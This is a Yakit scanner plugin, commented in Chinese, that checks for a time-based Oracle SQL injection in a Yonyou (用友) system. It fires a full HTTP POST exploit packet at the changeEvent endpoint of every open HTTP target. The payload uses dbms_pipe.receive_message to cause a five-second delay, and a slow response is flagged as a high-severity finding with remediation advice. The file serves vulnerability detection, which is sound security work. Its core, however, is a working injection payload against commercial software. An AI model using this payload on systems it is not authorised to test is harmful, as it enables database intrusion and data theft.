# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 完整的POST请求包
    packet = `POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Host: {{params(target)}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00`

    // 记录请求开始时间
    start_time = time.Now()

    // 发送请求
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({"target": addr}),
        poc.https(isTls),
        poc.redirectTimes(0),
        poc.timeout(10)
    )

    // 计算响应时间
    response_time = time.Since(start_time)

    // 判断响应时间是否超过5秒
    if response_time.Seconds() > 5 {
        yakit.Info("%v 发现用友SQL注入漏洞(2025.4)", addr)
        risk.NewRisk(
            addr,
            risk.title("用友系统SQL注入漏洞(2025.4)"),
            risk.severity("high"),
            risk.description("通过dbms_pipe.receive_message函数触发5秒延迟,确认存在Oracle SQL注入漏洞"),  // 新增
            risk.solution("1. 升级至最新补丁\n2. 使用参数化查询\n3. 限制数据库函数权限"),  // 新增
            risk.titleVerbose("用友时间延迟型SQL注入"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.details("漏洞位置：/portal/pt/oacoSchedulerEvents/changeEvent接口"),
            risk.cve(""),  // 若无CVE可留空
        )
    }
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
